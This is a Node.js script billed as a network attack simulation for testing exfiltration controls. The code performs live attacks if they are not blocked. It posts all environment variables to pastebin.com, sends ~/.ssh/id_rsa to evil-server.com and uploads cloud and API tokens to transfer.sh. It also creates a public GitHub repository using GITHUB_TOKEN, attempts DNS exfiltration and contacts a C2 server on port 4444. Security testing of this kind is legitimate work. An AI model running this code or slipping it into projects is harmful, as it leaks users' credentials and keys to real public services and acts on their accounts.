#!/usr/bin/env node

/**
 * Network-Based Attack Simulations
 * Tests network security controls and exfiltration detection
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');

console.log('\n╔╗');
console.log('   NETWORK ATTACK SIMULATION                      ');
console.log('╚╝\n');

const attacks = [];

// Attack 1: Exfiltrate to pastebin
function attackPastebinExfil() {
  console.log(' Attack 1: Attempting to exfiltrate data to pastebin...');
  
  const stolenData = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: os.platform(),
    env: process.env
  };
  
  const postData = JSON.stringify(stolenData);
  
  const options = {
    hostname: 'pastebin.com',
    port: 443,
    path: '/api/api_post.php',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };
  
  return new Promise((resolve) => {
    const req = https.request(options, (res) => {
      console.log(`    Successfully sent data to pastebin (status: ${res.statusCode})`);
      attacks.push({ attack: 'PASTEBIN_EXFIL', success: true, destination: 'pastebin.com' });
      resolve();
    });
    
    req.on('error', (e) => {
      console.log(`   ✗ BLOCKED: ${e.message}`);
      attacks.push({ attack: 'PASTEBIN_EXFIL', success: false, reason: e.message });
      resolve();
    });
    
    req.write(postData);
    req.end();
  });
}

// Attack 2: Exfiltrate SSH keys via HTTP POST
function attackSSHKeyExfil() {
  console.log('\n Attack 2: Attempting to exfiltrate SSH private key...');
  
  try {
    const keyPath = path.join(os.homedir(), '.ssh', 'id_rsa');
    const sshKey = fs.readFileSync(keyPath, 'utf8');
    
    const postData = `key=${encodeURIComponent(sshKey)}`;
    
    const options = {
      hostname: 'evil-server.com',
      port: 443,
      path: '/collect',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    
    return new Promise((resolve) => {
      const req = https.request(options, (res) => {
        console.log(`    Successfully exfiltrated SSH key (status: ${res.statusCode})`);
        attacks.push({ attack: 'SSH_KEY_EXFIL', success: true, destination: 'evil-server.com' });
        resolve();
      });
      
      req.on('error', (e) => {
        console.log(`   ✗ BLOCKED: ${e.message}`);
        attacks.push({ attack: 'SSH_KEY_EXFIL', success: false, reason: e.message });
        resolve();
      });
      
      req.write(postData);
      req.end();
    });
  } catch (e) {
    console.log(`   ✗ BLOCKED at file read: ${e.message}`);
    attacks.push({ attack: 'SSH_KEY_EXFIL', success: false, reason: 'File read blocked' });
    return Promise.resolve();
  }
}

// Attack 3: Connect to C&C server on suspicious port
function attackC2Connection() {
  console.log('\n Attack 3: Attempting to connect to C&C server on port 4444...');
  
  const options = {
    hostname: 'attacker.example.com',
    port: 4444,
    path: '/c2',
    method: 'GET'
  };
  
  return new Promise((resolve) => {
    const req = http.request(options, (res) => {
      console.log(`    Successfully connected to C&C server (status: ${res.statusCode})`);
      attacks.push({ attack: 'C2_CONNECTION', success: true, port: 4444 });
      resolve();
    });
    
    req.on('error', (e) => {
      console.log(`   ✗ BLOCKED: ${e.message}`);
      attacks.push({ attack: 'C2_CONNECTION', success: false, reason: e.message });
      resolve();
    });
    
    req.setTimeout(3000, () => {
      req.destroy();
      console.log('   ✗ TIMEOUT');
      attacks.push({ attack: 'C2_CONNECTION', success: false, reason: 'timeout' });
      resolve();
    });
    
    req.end();
  });
}

// Attack 4: Raw IP address connection (common in malware)
function attackRawIPConnection() {
  console.log('\n Attack 4: Attempting connection to raw IP address...');
  
  const options = {
    hostname: '192.168.1.100',
    port: 8080,
    path: '/data',
    method: 'POST'
  };
  
  return new Promise((resolve) => {
    const req = http.request(options, (res) => {
      console.log(`    Successfully connected to raw IP (status: ${res.statusCode})`);
      attacks.push({ attack: 'RAW_IP_CONNECTION', success: true, ip: '192.168.1.100' });
      resolve();
    });
    
    req.on('error', (e) => {
      console.log(`   ✗ BLOCKED: ${e.message}`);
      attacks.push({ attack: 'RAW_IP_CONNECTION', success: false, reason: e.message });
      resolve();
    });
    
    req.setTimeout(2000, () => {
      req.destroy();
      console.log('   ✗ TIMEOUT/BLOCKED');
      attacks.push({ attack: 'RAW_IP_CONNECTION', success: false, reason: 'timeout' });
      resolve();
    });
    
    req.end();
  });
}

// Attack 5: Exfiltrate environment variables with tokens
function attackEnvVarExfil() {
  console.log('\n Attack 5: Attempting to exfiltrate environment variables...');
  
  const sensitiveEnv = {};
  const sensitiveKeys = [
    'GITHUB_TOKEN', 'NPM_TOKEN', 'AWS_ACCESS_KEY_ID', 
    'AWS_SECRET_ACCESS_KEY', 'OPENAI_API_KEY', 'STRIPE_SECRET_KEY'
  ];
  
  sensitiveKeys.forEach(key => {
    if (process.env[key]) {
      sensitiveEnv[key] = process.env[key];
    }
  });
  
  const postData = JSON.stringify(sensitiveEnv);
  
  const options = {
    hostname: 'transfer.sh',
    port: 443,
    path: '/tokens',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };
  
  return new Promise((resolve) => {
    const req = https.request(options, (res) => {
      console.log(`    Successfully exfiltrated env vars (status: ${res.statusCode})`);
      attacks.push({ attack: 'ENV_VAR_EXFIL', success: true, destination: 'transfer.sh' });
      resolve();
    });
    
    req.on('error', (e) => {
      console.log(`   ✗ BLOCKED: ${e.message}`);
      attacks.push({ attack: 'ENV_VAR_EXFIL', success: false, reason: e.message });
      resolve();
    });
    
    req.write(postData);
    req.end();
  });
}

// Attack 6: Create GitHub repository (Shai-Hulud technique)
function attackGitHubRepoCreation() {
  console.log('\n Attack 6: Attempting to create malicious GitHub repository...');
  
  const githubToken = process.env.GITHUB_TOKEN || 'fake_token';
  
  const repoData = JSON.stringify({
    name: 'shai-hulud-replica',
    description: 'Malicious repository for propagation',
    private: false,
    auto_init: true
  });
  
  const options = {
    hostname: 'api.github.com',
    port: 443,
    path: '/user/repos',
    method: 'POST',
    headers: {
      'Authorization': `token ${githubToken}`,
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(repoData),
      'User-Agent': 'Node.js'
    }
  };
  
  return new Promise((resolve) => {
    const req = https.request(options, (res) => {
      if (res.statusCode === 201) {
        console.log(`    Successfully created malicious GitHub repo (status: ${res.statusCode})`);
        attacks.push({ attack: 'GITHUB_REPO_CREATE', success: true });
      } else {
        console.log(`   ✗ Failed: status ${res.statusCode}`);
        attacks.push({ attack: 'GITHUB_REPO_CREATE', success: false, reason: `HTTP ${res.statusCode}` });
      }
      resolve();
    });
    
    req.on('error', (e) => {
      console.log(`   ✗ BLOCKED: ${e.message}`);
      attacks.push({ attack: 'GITHUB_REPO_CREATE', success: false, reason: e.message });
      resolve();
    });
    
    req.write(repoData);
    req.end();
  });
}

// Attack 7: Data exfiltration via DNS (advanced technique)
function attackDNSExfil() {
  console.log('\n Attack 7: DNS-based data exfiltration (simulated)...');
  
  // In real attack, this would encode data in DNS queries
  // Example: stolen-data-abc123.attacker.com
  
  const dns = require('dns');
  const stolenData = Buffer.from('STOLEN_CREDENTIALS').toString('base64').replace(/=/g, '');
  const maliciousDomain = `${stolenData}.exfil.attacker.com`;
  
  return new Promise((resolve) => {
    dns.lookup(maliciousDomain, (err, address) => {
      if (err) {
        console.log(`   ✗ DNS exfiltration blocked or failed: ${err.message}`);
        attacks.push({ attack: 'DNS_EXFIL', success: false, reason: err.message });
      } else {
        console.log(`    DNS query succeeded (potential exfiltration channel)`);
        attacks.push({ attack: 'DNS_EXFIL', success: true });
      }
      resolve();
    });
  });
}

// Attack 8: WebSocket connection for reverse shell
function attackWebSocketReverseShell() {
  console.log('\n Attack 8: WebSocket reverse shell attempt (simulated)...');
  
  // Simulated - real attack would use 'ws' module
  console.log('     Would attempt: ws://attacker.com:6666/shell');
  attacks.push({ attack: 'WEBSOCKET_REVERSE_SHELL', success: false, reason: 'Not implemented in test' });
  return Promise.resolve();
}

// Run all attacks
async function runAllAttacks() {
  console.log('Starting network-based attack simulation...\n');
  
  await attackPastebinExfil();
  await attackSSHKeyExfil();
  await attackC2Connection();
  await attackRawIPConnection();
  await attackEnvVarExfil();
  await attackGitHubRepoCreation();
  await attackDNSExfil();
  await attackWebSocketReverseShell();
  
  // Summary
  console.log('\n╔╗');
  console.log('  ATTACK SUMMARY                                    ');
  console.log('╚╝\n');
  
  const successful = attacks.filter(a => a.success).length;
  const blocked = attacks.filter(a => !a.success).length;
  
  console.log(`Total Attacks:     ${attacks.length}`);
  console.log(`Successful:        ${successful} `);
  console.log(`Blocked:           ${blocked} `);
  console.log(`Protection Rate:   ${Math.round((blocked / attacks.length) * 100)}%\n`);
  
  if (successful > 0) {
    console.log('WARNING: Some attacks succeeded!');
    console.log('Successful attacks:');
    attacks.filter(a => a.success).forEach(a => {
      console.log(`  - ${a.attack}`);
    });
  }
  
  // Save report
  try {
    fs.writeFileSync('network-attack-report.json', JSON.stringify({ attacks, timestamp: new Date().toISOString() }, null, 2));
    console.log('\n📄 Full report saved to network-attack-report.json');
  } catch (e) {
    // Ignore
  }
}

runAllAttacks().catch(console.error);
